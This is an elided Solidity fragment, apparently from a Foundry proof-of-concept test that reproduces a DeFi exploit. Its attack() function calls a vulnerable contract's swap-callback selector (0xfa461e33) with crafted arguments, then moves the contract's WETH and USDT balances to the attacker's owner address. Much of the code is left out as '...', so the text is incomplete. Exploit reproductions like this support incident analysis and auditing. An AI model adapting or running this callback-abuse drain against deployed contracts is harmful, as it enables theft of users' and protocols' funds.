...
contract ContractTest is Test {
    ...
    function getcodehash() public pure returns (bytes32) {
...
contract Money is Test {
    ...
    function attack(address vuln, address token, uint256 amount) public {
        ...
        (bool success,) = VulnContract.call(abi.encodeWithSelector(bytes4(0xfa461e33), -1, amount, data));
        require(success, "Attack failed");
        WETH.transfer(address(owner), WETH.balanceOf(address(this)));
        (bool success1,) = address(USDT).call(
            abi.encodeWithSelector(bytes4(0xa9059cbb), address(owner), USDT.balanceOf(address(this)))
        );
